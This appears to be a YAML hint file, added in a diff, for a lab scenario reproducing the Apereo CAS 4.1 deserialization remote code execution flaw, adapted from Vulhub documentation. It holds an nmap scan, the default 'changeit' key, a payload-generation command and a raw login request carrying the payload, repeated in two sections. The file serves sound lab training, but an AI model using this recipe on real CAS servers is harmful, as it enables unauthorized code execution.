@@ -1,0 +1,158 @@
+# Optional ScenarioForge guide hints; derived from the adjacent public Vulhub documentation.
+schema_version: 1
+match: apereo-cas/4.1-rce
+hint_levels:
+  low:
+  - Inspect the apereo-cas service or application on {{NODE_NAME}} @ {{NODE_IP}}.
+  medium:
+  - |-
+    Catalog TCP ports: 8080. Identify the exposed services:
+
+    ```bash
+    nmap -Pn -sT -sV -p 8080 {{NODE_IP}}
+    ```
+  - 'Catalog port mappings (published → container): web: 8080/tcp → container 8080/tcp. These are recipe defaults;
+    use the deployed service port if the scenario remaps it.'
+  - 'Documented target URL(s): `http://{{NODE_IP}}:8080/cas/login`, `http://{{NODE_IP}}:8080`.'
+  high:
+  - 'Vulnerability: Apereo CAS 4.1 Deserialization RCE Vulnerability.'
+  - Send the raw request examples with an HTTP client that recalculates Content-Length after target and payload
+    substitutions.
+  - |-
+    Exploit
+
+    The out-of-the-box default configuration of Apereo CAS before 4.1.7, is using a default secret key `changeit`:
+
+    ```java
+    public class EncryptedTranscoder implements Transcoder {
+        private CipherBean cipherBean;
+        private boolean compression = true;
+
+        public EncryptedTranscoder() throws IOException {
+            BufferedBlockCipherBean bufferedBlockCipherBean = new BufferedBlockCipherBean();
+            bufferedBlockCipherBean.setBlockCipherSpec(new BufferedBlockCipherSpec("AES", "CBC", "PKCS7"));
+            bufferedBlockCipherBean.setKeyStore(this.createAndPrepareKeyStore());
+            bufferedBlockCipherBean.setKeyAlias("aes128");
+            bufferedBlockCipherBean.setKeyPassword("changeit");
+            bufferedBlockCipherBean.setNonce(new RBGNonce());
+            this.setCipherBean(bufferedBlockCipherBean);
+        }
+
+        // ...
+    ```
+
+    We can try to use Apereo-CAS-Attack: https://github.com/vulhub/Apereo-CAS-Attack to generate a encrypted ysoserial: https://github.com/frohoff/ysoserial's serialized object:
+
+    ```
+    java -jar apereo-cas-attack-1.0-SNAPSHOT-all.jar CommonsCollections4 "touch /tmp/success"
+    ```
+
+    Documentation illustration: https://github.com/vulhub/vulhub/blob/3af973a39bd0988f288a53fa9ea4b82372774e58/apereo-cas/4.1-rce/1.png
+
+    Then, intercept and modify the http request from login action of `/cas/login`, put the payload into `execution`'s value:
+
+    ```
+    POST /cas/login HTTP/1.1
+    Host: {{NODE_IP}}
+    Cache-Control: max-age=0
+    Upgrade-Insecure-Requests: 1
+    Origin: http://{{NODE_IP}}:8080
+    Content-Type: application/x-www-form-urlencoded
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Safari/537.36
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+    Referer: http://{{NODE_IP}}:8080/cas/login
+    Accept-Encoding: gzip, deflate
+    Accept-Language: en,zh-CN;q=0.9,zh;q=0.8
+    Cookie: JSESSIONID=24FB4BAAE1A66E8B76D521EE366B3E12; _ga=GA1.1.1139210877.1586367734
+    Connection: close
+
+    username=test&password=test&lt=LT-2-gs2epe7hUYofoq0gI21Cf6WZqMiJyj-cas01.example.org&execution=[payload]&_eventId=submit&submit=LOGIN
+    ```
+
+    Documentation illustration: https://github.com/vulhub/vulhub/blob/3af973a39bd0988f288a53fa9ea4b82372774e58/apereo-cas/4.1-rce/2.png
+
+    Congrats, `touch /tmp/success` has been successfully executed:
+
+    Documentation illustration: https://github.com/vulhub/vulhub/blob/3af973a39bd0988f288a53fa9ea4b82372774e58/apereo-cas/4.1-rce/3.png
+  - 'Publicly available documentation: https://github.com/vulhub/vulhub/blob/3af973a39bd0988f288a53fa9ea4b82372774e58/apereo-cas/4.1-rce/README.md'
+  - |-
+    Additional public references:
+    - https://apereo.github.io/2016/04/08/commonsvulndisc/
+access_instructions:
+  title: Apereo CAS 4.1 Deserialization RCE Vulnerability
+  steps:
+  - title: Locate the target service
+    instructions: |-
+      Catalog TCP ports: 8080. Identify the exposed services:
+
+      ```bash
+      nmap -Pn -sT -sV -p 8080 {{NODE_IP}}
+      ```
+
+      Catalog port mappings (published → container): web: 8080/tcp → container 8080/tcp. These are recipe defaults; use the deployed service port if the scenario remaps it.
+
+      Documented target URL(s): `http://{{NODE_IP}}:8080/cas/login`, `http://{{NODE_IP}}:8080`.
+  - title: Exploit
+    instructions: |-
+      The out-of-the-box default configuration of Apereo CAS before 4.1.7, is using a default secret key `changeit`:
+
+      ```java
+      public class EncryptedTranscoder implements Transcoder {
+          private CipherBean cipherBean;
+          private boolean compression = true;
+
+          public EncryptedTranscoder() throws IOException {
+              BufferedBlockCipherBean bufferedBlockCipherBean = new BufferedBlockCipherBean();
+              bufferedBlockCipherBean.setBlockCipherSpec(new BufferedBlockCipherSpec("AES", "CBC", "PKCS7"));
+              bufferedBlockCipherBean.setKeyStore(this.createAndPrepareKeyStore());
+              bufferedBlockCipherBean.setKeyAlias("aes128");
+              bufferedBlockCipherBean.setKeyPassword("changeit");
+              bufferedBlockCipherBean.setNonce(new RBGNonce());
+              this.setCipherBean(bufferedBlockCipherBean);
+          }
+
+          // ...
+      ```
+
+      We can try to use Apereo-CAS-Attack: https://github.com/vulhub/Apereo-CAS-Attack to generate a encrypted ysoserial: https://github.com/frohoff/ysoserial's serialized object:
+
+      ```
+      java -jar apereo-cas-attack-1.0-SNAPSHOT-all.jar CommonsCollections4 "touch /tmp/success"
+      ```
+
+      Documentation illustration: https://github.com/vulhub/vulhub/blob/3af973a39bd0988f288a53fa9ea4b82372774e58/apereo-cas/4.1-rce/1.png
+
+      Then, intercept and modify the http request from login action of `/cas/login`, put the payload into `execution`'s value:
+
+      ```
+      POST /cas/login HTTP/1.1
+      Host: {{NODE_IP}}
+      Cache-Control: max-age=0
+      Upgrade-Insecure-Requests: 1
+      Origin: http://{{NODE_IP}}:8080
+      Content-Type: application/x-www-form-urlencoded
+      User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Safari/537.36
+      Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+      Referer: http://{{NODE_IP}}:8080/cas/login
+      Accept-Encoding: gzip, deflate
+      Accept-Language: en,zh-CN;q=0.9,zh;q=0.8
+      Cookie: JSESSIONID=24FB4BAAE1A66E8B76D521EE366B3E12; _ga=GA1.1.1139210877.1586367734
+      Connection: close
+
+      username=test&password=test&lt=LT-2-gs2epe7hUYofoq0gI21Cf6WZqMiJyj-cas01.example.org&execution=[payload]&_eventId=submit&submit=LOGIN
+      ```
+
+      Documentation illustration: https://github.com/vulhub/vulhub/blob/3af973a39bd0988f288a53fa9ea4b82372774e58/apereo-cas/4.1-rce/2.png
+
+      Congrats, `touch /tmp/success` has been successfully executed:
+
+      Documentation illustration: https://github.com/vulhub/vulhub/blob/3af973a39bd0988f288a53fa9ea4b82372774e58/apereo-cas/4.1-rce/3.png
+guidance_source:
+  repository: https://github.com/vulhub/vulhub
+  snapshot_commit: 3af973a39bd0988f288a53fa9ea4b82372774e58
+  documentation_url: https://github.com/vulhub/vulhub/blob/3af973a39bd0988f288a53fa9ea4b82372774e58/apereo-cas/4.1-rce/README.md
+  readme_sha256: ec276a0d19c9ff1d479259504322ad08acea894fa2794f234c78d204b483c3e7
+  compose_sha256: 2833ac83d1334722a9577c7d90800f2549a97cef267967ecbbb09ef0db6ff451
+  license: MIT; see vulnhub/content/LICENSE
+  method: Tiered discovery hints and adapted reproduction text from the local catalog snapshot. Reproduction commands
+    have not been executed.
